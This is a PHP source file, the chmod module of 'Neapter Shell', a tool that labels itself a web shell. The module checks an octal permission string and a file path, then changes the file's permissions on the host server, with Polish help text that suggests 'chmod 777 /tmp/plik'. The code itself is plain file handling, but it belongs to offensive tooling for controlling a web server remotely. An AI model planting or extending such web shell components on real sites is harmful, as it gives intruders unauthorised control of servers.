<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Get file content
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModuleChmod extends ModuleAbstract
{
    /**
     * Get list of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array('chmod');
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getVersion()
    {
        return '1.1.1 2016-06-09 - <krzotr@gmail.com>';
    }

    /**
     * Get details module information
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Zmiana uprawnień dla pliku

	Użycie:
		chmod uprawnienia plik_lub_katalog

	Przykład:
		chmod 777 /tmp/plik
DATA;
    }

    /**
     * Execute module
     *
     * @return string
     */
    public function get()
    {
        if ($this->oArgs->getNumberOfParams() !== 2) {
            return self::getHelp();
        }

        $sChmod = (string) $this->oArgs->getParam(0);
        $sFile = $this->oArgs->getParam(1);

        if (!preg_match('~^[0-7]{3,4}\z~', $sChmod)) {
            return sprintf('Błędny chmod "%s"', $sChmod);
        }

        if (!file_exists($sFile)) {
            return sprintf('Plik "%s" nie istnieje', $sFile);
        }

        return sprintf(
            'Uprawnienia %szostały zmienione',
            (! @chmod($sFile, base_convert($sChmod, 8, 10)) ? 'nie ' : '')
        );
    }
}
